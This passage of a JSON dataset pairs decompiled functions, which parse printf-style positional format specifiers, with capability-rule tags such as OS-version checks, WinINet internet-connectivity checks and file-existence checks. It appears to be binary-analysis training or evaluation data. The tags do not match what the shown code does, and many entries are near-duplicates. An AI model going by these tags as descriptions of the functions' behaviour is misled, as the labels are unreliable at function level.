fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        *(param_1 + 0x20) = **(param_1 + 0x46c + iVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 492
    },
    "00453aa5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00453aa5(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        puVar1 = *(param_1 + 0x10);\n        *(param_1 + 0x10) = puVar1 + 1;\n        *(param_1 + 0x20) = *puVar1;\n    }\n    else {\n        var_4h = *(param_1 + 0xc);\n        iVar2 = fcn.004401db(*(param_1 + 8), var_4h, &var_4h, 10, 1);\n        iVar2 = iVar2 + -1;\n        *(param_1 + 0xc) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar2) && (*var_4h == 0x24)) && (iVar2 < 100)) {\n                iVar3 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar2) {\n                    iVar3 = iVar2;\n                }\n                *(param_1 + 0xaa4) = iVar3;\n                uVar4 = fcn.004541f5(param_1 + 0x464 + iVar2 * 0x10, 1, *(param_1 + 0x2e), *(param_1 + 0x28));\n                return uVar4;\n            }\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        *(param_1 + 0x20) = **(param_1 + 0x46c + iVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 494
    },
    "00453c2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00453c2b(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        puVar1 = *(param_1 + 0x10);\n        *(param_1 + 0x10) = puVar1 + 1;\n        *(param_1 + 0x24) = *puVar1;\n    }\n    else {\n        var_4h = *(param_1 + 0xc);\n        iVar2 = fcn.0043ffcc(*(param_1 + 8), var_4h, &var_4h, 10, 1);\n        iVar2 = iVar2 + -1;\n        *(param_1 + 0xc) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar2) && (*var_4h == '$')) && (iVar2 < 100)) {\n                iVar3 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar2) {\n                    iVar3 = iVar2;\n                }\n                *(param_1 + 0xaa4) = iVar3;\n                uVar4 = fcn.004540cd(param_1 + 0x464 + iVar2 * 0x10, 1, *(param_1 + 0x2d), *(param_1 + 0x28));\n                return uVar4;\n            }\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 490
    },
    "00453d00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00453d00(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        puVar1 = *(param_1 + 0x10);\n        *(param_1 + 0x10) = puVar1 + 1;\n        *(param_1 + 0x24) = *puVar1;\n    }\n    else {\n        var_4h = *(param_1 + 0xc);\n        iVar2 = fcn.0043ffcc(*(param_1 + 8), var_4h, &var_4h, 10, 1);\n        iVar2 = iVar2 + -1;\n        *(param_1 + 0xc) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar2) && (*var_4h == '$')) && (iVar2 < 100)) {\n                iVar3 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar2) {\n                    iVar3 = iVar2;\n                }\n                *(param_1 + 0xaa4) = iVar3;\n                uVar4 = fcn.0045412f(param_1 + 0x464 + iVar2 * 0x10, 1, *(param_1 + 0x2d), *(param_1 + 0x28));\n                return uVar4;\n            }\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 490
    },
    "00453dd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00453dd5(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        puVar1 = *(param_1 + 0x10);\n        *(param_1 + 0x10) = puVar1 + 1;\n        *(param_1 + 0x24) = *puVar1;\n    }\n    else {\n        var_4h = *(param_1 + 0xc);\n        iVar2 = fcn.004401db(*(param_1 + 8), var_4h, &var_4h, 10, 1);\n        iVar2 = iVar2 + -1;\n        *(param_1 + 0xc) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar2) && (*var_4h == 0x24)) && (iVar2 < 100)) {\n                iVar3 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar2) {\n                    iVar3 = iVar2;\n                }\n                *(param_1 + 0xaa4) = iVar3;\n                uVar4 = fcn.00454191(param_1 + 0x464 + iVar2 * 0x10, 1, *(param_1 + 0x2e), *(param_1 + 0x28));\n                return uVar4;\n            }\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 493
    },
    "00453eab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00453eab(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        puVar1 = *(param_1 + 0x10);\n        *(param_1 + 0x10) = puVar1 + 1;\n        *(param_1 + 0x24) = *puVar1;\n    }\n    else {\n        var_4h = *(param_1 + 0xc);\n        iVar2 = fcn.004401db(*(param_1 + 8), var_4h, &var_4h, 10, 1);\n        iVar2 = iVar2 + -1;\n        *(param_1 + 0xc) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar2) && (*var_4h == 0x24)) && (iVar2 < 100)) {\n                iVar3 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar2) {\n                    iVar3 = iVar2;\n                }\n                *(param_1 + 0xaa4) = iVar3;\n                uVar4 = fcn.004541f5(param_1 + 0x464 + iVar2 * 0x10, 1, *(param_1 + 0x2e), *(param_1 + 0x28));\n                return uVar4;\n            }\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 494
    },
    "00454259": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00454259(int32_t param_1)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    char *var_8h;\n    char *var_4h;\n    \n    if (*(param_1 + 0x18) == '\\x01') {\n        pcVar3 = *(param_1 + 0xc);\n        in_EAX = in_EAX & 0xffffff00;\n        if (*pcVar3 != '%') {\n            if (*(param_1 + 0x45c) == 0) {\n                if (((9 < *pcVar3 - 0x30U) ||\n                    (var_4h = pcVar3,  in_EAX = fcn.0043ffcc(*(param_1 + 8), pcVar3, &var_4h, 10, 1),  in_EAX < 1)) ||\n                   (in_EAX = var_4h,  *var_4h != '$')) {\n                    *(param_1 + 0x45c) = 1;\n                    goto code_r0x004542e1;\n                }\n                if (*(param_1 + 0x458) == 1) {\n                    fcn.00431db0(param_1 + 0x464, 0, 0x640);\n                }\n                *(param_1 + 0x45c) = 2;\n            }\n            else if (*(param_1 + 0x45c) != 2) goto code_r0x004542e1;\n            var_8h = *(param_1 + 0xc);\n            iVar1 = fcn.0043ffcc(*(param_1 + 8), var_8h, &var_8h, 10, 1);\n            pcVar3 = iVar1 + -1;\n            in_EAX = var_8h + 1;\n            *(param_1 + 0xaa8) = pcVar3;\n            *(param_1 + 0xc) = in_EAX;\n            if (*(param_1 + 0x458) == 1) {\n                if (((pcVar3 < 0) || (*var_8h != '$')) || (99 < pcVar3)) {\n                    iVar1 = *(param_1 + 8);\n                    *(iVar1 + 0x1c) = 1;\n                    *(iVar1 + 0x18) = 0x16;\n                    uVar2 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                    return uVar2 & 0xffffff00;\n                }\n                in_EAX = *(param_1 + 0xaa4);\n                if (pcVar3 <= in_EAX) {\n                    pcVar3 = in_EAX;\n                }\n                *(param_1 + 0xaa4) = pcVar3;\n            }\n        }\n    }\ncode_r0x004542e1:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 679
    },
    "00454370": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00454370(int32_t param_1)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    char *var_8h;\n    char *var_4h;\n    \n    if (*(param_1 + 0x18) == '\\x01') {\n        pcVar3 = *(param_1 + 0xc);\n        in_EAX = in_EAX & 0xffffff00;\n        if (*pcVar3 != '%') {\n            if (*(param_1 + 0x45c) == 0) {\n                if (((9 < *pcVar3 - 0x30U) ||\n                    (var_4h = pcVar3,  in_EAX = fcn.0043ffcc(*(param_1 + 8), pcVar3, &var_4h, 10, 1),  in_EAX < 1)) ||\n                   (in_EAX = var_4h,  *var_4h != '$')) {\n                    *(param_1 + 0x45c) = 1;\n                    goto code_r0x004543f8;\n                }\n                if (*(param_1 + 0x458) == 1) {\n                    fcn.00431db0(param_1 + 0x464, 0, 0x640);\n                }\n                *(param_1 + 0x45c) = 2;\n            }\n            else if (*(param_1 + 0x45c) != 2) goto code_r0x004543f8;\n            var_8h = *(param_1 + 0xc);\n            iVar1 = fcn.0043ffcc(*(param_1 + 8), var_8h, &var_8h, 10, 1);\n            pcVar3 = iVar1 + -1;\n            in_EAX = var_8h + 1;\n            *(param_1 + 0xaa8) = pcVar3;\n            *(param_1 + 0xc) = in_EAX;\n            if (*(param_1 + 0x458) == 1) {\n                if (((pcVar3 < 0) || (*var_8h != '$')) || (99 < pcVar3)) {\n                    iVar1 = *(param_1 + 8);\n                    *(iVar1 + 0x1c) = 1;\n                    *(iVar1 + 0x18) = 0x16;\n                    uVar2 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                    return uVar2 & 0xffffff00;\n                }\n                in_EAX = *(param_1 + 0xaa4);\n                if (pcVar3 <= in_EAX) {\n                    pcVar3 = in_EAX;\n                }\n                *(param_1 + 0xaa4) = pcVar3;\n            }\n        }\n    }\ncode_r0x004543f8:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 679
    },
    "00454487": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00454487(int32_t param_1)\n\n{\n    uint16_t *in_EAX;\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint16_t *puVar4;\n    int16_t *var_8h;\n    uint16_t *var_4h;\n    \n    if (*(param_1 + 0x18) == '\\x01') {\n        puVar4 = *(param_1 + 0xc);\n        puVar1 = *puVar4;\n        in_EAX = puVar1;\n        if (puVar1 != 0x25) {\n            in_EAX = *(param_1 + 0x45c);\n            if (in_EAX == NULL) {\n                in_EAX = puVar1 + -0x18;\n                if (((9 < puVar1 + -0x18) ||\n                    (var_4h = puVar4,  in_EAX = fcn.004401db(*(param_1 + 8), puVar4, &var_4h, 10, 1),  in_EAX < 1)) ||\n                   (in_EAX = var_4h,  *var_4h != 0x24)) {\n                    *(param_1 + 0x45c) = 1;\n                    goto code_r0x00454519;\n                }\n                if (*(param_1 + 0x458) == 1) {\n                    fcn.00431db0(param_1 + 0x464, 0, 0x640);\n                }\n                *(param_1 + 0x45c) = 2;\n            }\n            else if (in_EAX != 0x2) goto code_r0x00454519;\n            var_8h = *(param_1 + 0xc);\n            iVar2 = fcn.004401db(*(param_1 + 8), var_8h, &var_8h, 10, 1);\n            puVar4 = iVar2 + -1;\n            in_EAX = var_8h + 1;\n            *(param_1 + 0xaa8) = puVar4;\n            *(param_1 + 0xc) = in_EAX;\n            if (*(param_1 + 0x458) == 1) {\n                if (((puVar4 < 0) || (*var_8h != 0x24)) || (99 < puVar4)) {\n                    iVar2 = *(param_1 + 8);\n                    *(iVar2 + 0x1c) = 1;\n                    *(iVar2 + 0x18) = 0x16;\n                    uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                    return uVar3 & 0xffffff00;\n                }\n                in_EAX = *(param_1 + 0xaa4);\n                if (puVar4 <= in_EAX) {\n                    puVar4 = in_EAX;\n                }\n                *(param_1 + 0xaa4) = puVar4;\n            }\n        }\n    }\ncode_r0x00454519:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 720
    },
    "004545ab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004545ab(int32_t param_1)\n\n{\n    uint16_t *in_EAX;\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint16_t *puVar4;\n    int16_t *var_8h;\n    uint16_t *var_4h;\n    \n    if (*(param_1 + 0x18) == '\\x01') {\n        puVar4 = *(param_1 + 0xc);\n        puVar1 = *puVar4;\n        in_EAX = puVar1;\n        if (puVar1 != 0x25) {\n            in_EAX = *(param_1 + 0x45c);\n            if (in_EAX == NULL) {\n                in_EAX = puVar1 + -0x18;\n                if (((9 < puVar1 + -0x18) ||\n                    (var_4h = puVar4,  in_EAX = fcn.004401db(*(param_1 + 8), puVar4, &var_4h, 10, 1),  in_EAX < 1)) ||\n                   (in_EAX = var_4h,  *var_4h != 0x24)) {\n                    *(param_1 + 0x45c) = 1;\n                    goto code_r0x0045463d;\n                }\n                if (*(param_1 + 0x458) == 1) {\n                    fcn.00431db0(param_1 + 0x464, 0, 0x640);\n                }\n                *(param_1 + 0x45c) = 2;\n            }\n            else if (in_EAX != 0x2) goto code_r0x0045463d;\n            var_8h = *(param_1 + 0xc);\n            iVar2 = fcn.004401db(*(param_1 + 8), var_8h, &var_8h, 10, 1);\n            puVar4 = iVar2 + -1;\n            in_EAX = var_8h + 1;\n            *(param_1 + 0xaa8) = puVar4;\n            *(param_1 + 0xc) = in_EAX;\n            if (*(param_1 + 0x458) == 1) {\n                if (((puVar4 < 0) || (*var_8h != 0x24)) || (99 < puVar4)) {\n                    iVar2 = *(param_1 + 8);\n                    *(iVar2 + 0x1c) = 1;\n                    *(iVar2 + 0x18) = 0x16;\n                    uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                    return uVar3 & 0xffffff00;\n                }\n                in_EAX = *(param_1 + 0xaa4);\n                if (puVar4 <= in_EAX) {\n                    puVar4 = in_EAX;\n                }\n                *(param_1 + 0xaa4) = puVar4;\n            }\n        }\n    }\ncode_r0x0045463d:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 723
    },
    "0045479f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0045479f(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    \n    piVar4 = in_EAX & 0xffffff00;\n    if ((*(param_1 + 6) != '\\0') && (*(param_1 + 6) != '\\a')) {\n        iVar1 = param_1[2];\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 0x16;\n        uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n        return uVar3 & 0xffffff00;\n    }\n    if ((param_1[0x117] == 2) && (param_1[0x116] == 1)) {\n        iVar1 = param_1[0x2a9];\n        piVar4 = param_1 + iVar1 * 4 + 4;\n        piVar5 = param_1 + 0x119;\n        if (param_1 != piVar4) {\n            do {\n                piVar5[2] = param_1[4];\n                iVar2 = *piVar5;\n                if (iVar2 == 1) {\ncode_r0x0045481d:\n                    param_1[4] = param_1[4] + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x0045481d;\n                        if (iVar2 != 4) {\n                            iVar1 = param_1[2];\n                            *(iVar1 + 0x1c) = 1;\n                            *(iVar1 + 0x18) = 0x16;\n                            uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n                            return uVar3 & 0xffffff00;\n                        }\n                    }\n                    param_1[4] = param_1[4] + 8;\n                }\n                piVar4 = param_1 + iVar1 * 4 + 0x119;\n                bVar6 = piVar5 != piVar4;\n                piVar5 = piVar5 + 4;\n            } while (bVar6);\n        }\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 583
    },
    "00454859": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00454859(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    \n    piVar4 = in_EAX & 0xffffff00;\n    if ((*(param_1 + 6) != '\\0') && (*(param_1 + 6) != '\\a')) {\n        iVar1 = param_1[2];\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 0x16;\n        uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n        return uVar3 & 0xffffff00;\n    }\n    if ((param_1[0x117] == 2) && (param_1[0x116] == 1)) {\n        iVar1 = param_1[0x2a9];\n        piVar4 = param_1 + iVar1 * 4 + 4;\n        piVar5 = param_1 + 0x119;\n        if (param_1 != piVar4) {\n            do {\n                piVar5[2] = param_1[4];\n                iVar2 = *piVar5;\n                if (iVar2 == 1) {\ncode_r0x004548d7:\n                    param_1[4] = param_1[4] + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x004548d7;\n                        if (iVar2 != 4) {\n                            iVar1 = param_1[2];\n                            *(iVar1 + 0x1c) = 1;\n                            *(iVar1 + 0x18) = 0x16;\n                            uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n                            return uVar3 & 0xffffff00;\n                        }\n                    }\n                    param_1[4] = param_1[4] + 8;\n                }\n                piVar4 = param_1 + iVar1 * 4 + 0x119;\n                bVar6 = piVar5 != piVar4;\n                piVar5 = piVar5 + 4;\n            } while (bVar6);\n        }\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 582
    },
    "00454913": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00454913(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    \n    piVar4 = in_EAX & 0xffffff00;\n    if ((*(param_1 + 6) != '\\0') && (*(param_1 + 6) != '\\a')) {\n        iVar1 = param_1[2];\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 0x16;\n        uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n        return uVar3 & 0xffffff00;\n    }\n    if ((param_1[0x117] == 2) && (param_1[0x116] == 1)) {\n        iVar1 = param_1[0x2a9];\n        piVar4 = param_1 + iVar1 * 4 + 4;\n        piVar5 = param_1 + 0x119;\n        if (param_1 != piVar4) {\n            do {\n                piVar5[2] = param_1[4];\n                iVar2 = *piVar5;\n                if (iVar2 == 1) {\ncode_r0x00454991:\n                    param_1[4] = param_1[4] + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x00454991;\n                        if (iVar2 != 4) {\n                            iVar1 = param_1[2];\n                            *(iVar1 + 0x1c) = 1;\n                            *(iVar1 + 0x18) = 0x16;\n                            uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n                            return uVar3 & 0xffffff00;\n                        }\n                    }\n                    param_1[4] = param_1[4] + 8;\n                }\n                piVar4 = param_1 + iVar1 * 4 + 0x119;\n                bVar6 = piVar5 != piVar4;\n                piVar5 = piVar5 + 4;\n            } while (bVar6);\n        }\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 580
    },
    "004549cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004549cd(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    \n    piVar4 = in_EAX & 0xffffff00;\n    if ((*(param_1 + 6) != '\\0') && (*(param_1 + 6) != '\\a')) {\n        iVar1 = param_1[2];\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 0x16;\n        uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n        return uVar3 & 0xffffff00;\n    }\n    if ((param_1[0x117] == 2) && (param_1[0x116] == 1)) {\n        iVar1 = param_1[0x2a9];\n        piVar4 = param_1 + iVar1 * 4 + 4;\n        piVar5 = param_1 + 0x119;\n        if (param_1 != piVar4) {\n            do {\n                piVar5[2] = param_1[4];\n                iVar2 = *piVar5;\n                if (iVar2 == 1) {\ncode_r0x00454a4b:\n                    param_1[4] = param_1[4] + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x00454a4b;\n                        if (iVar2 != 4) {\n                            iVar1 = param_1[2];\n                            *(iVar1 + 0x1c) = 1;\n                            *(iVar1 + 0x18) = 0x16;\n                            uVar3 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n                            return uVar3 & 0xffffff00;\n                        }\n                    }\n                    param_1[4] = param_1[4] + 8;\n                }\n                piVar4 = param_1 + iVar1 * 4 + 0x119;\n                bVar6 = piVar5 != piVar4;\n                piVar5 = piVar5 + 4;\n            } while (bVar6);\n        }\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 584
    },
    "00454a93": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00454a93(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            iVar1 = *(param_1 + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        uVar2 = fcn.004540cd(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x2d), *(param_1 + 0x28));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 238
    },
    "00454af2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00454af2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            iVar1 = *(param_1 + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        uVar2 = fcn.0045412f(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x2d), *(param_1 + 0x28));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 239
    },
    "00454b51": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00454b51(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            iVar1 = *(param_1 + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        uVar2 = fcn.00454191(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x2e), *(param_1 + 0x28));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 238
    },
    "00454bb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00454bb0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            iVar1 = *(param_1 + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        uVar2 = fcn.004541f5(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x2e), *(param_1 + 0x28));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 239
    },
    "00454ed2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
